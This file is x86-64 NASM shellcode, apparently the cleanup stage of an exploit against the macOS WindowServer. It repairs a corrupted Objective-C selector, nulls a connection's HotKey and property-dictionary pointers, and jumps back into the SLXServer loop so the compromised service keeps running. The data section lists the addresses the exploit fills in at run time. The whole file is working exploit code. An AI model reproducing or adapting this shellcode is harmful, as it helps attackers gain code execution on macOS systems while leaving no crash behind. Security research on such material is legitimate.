; compile with 'nasm shellcode.asm'

BITS 64

_start:
    add     rsp, 0x10000
    mov     r15, rax
    mov     [r15+0x3F00], r15           ; save the address of our shellcode

repair_objc:
    mov     rbx, [r15+0x3F28]
    sub     rbx, 0x75
    sub     byte [rbx], 0x70

repair_ws:
    mov     rdi, [r15+0x3F08]           ; ConnectionID
    call    [r15+0x3F10]                ; call CGXConnectionForConnectionID
    xor     r14, r14
    mov     [rax+144], r14              ; nuke HotKey pointer
    mov     [rax+160], r14              ; nuke Property Dictionary

resume_ws:
    lea     rbx, [r15+0x3F18]           ; ptr to _get_default_connection_tls_key_key
    mov     rbx, [rbx]
    xorps   xmm1, xmm1
    jmp     [r15+0x3F20]                ; jmp SLXServer

; Pseudo DATA section @ 0x3F00
; 0x3F00: [shellcode pointer]
; 0x3F08: [ConnectionID]
; 0x3F10: [CGXConnectionForConnectionID]
; 0x3F18: [_get_default_connection_tls_key_key]
; 0x3F20: [SLXServer Loop]
; 0x3F28: [SEL_release]
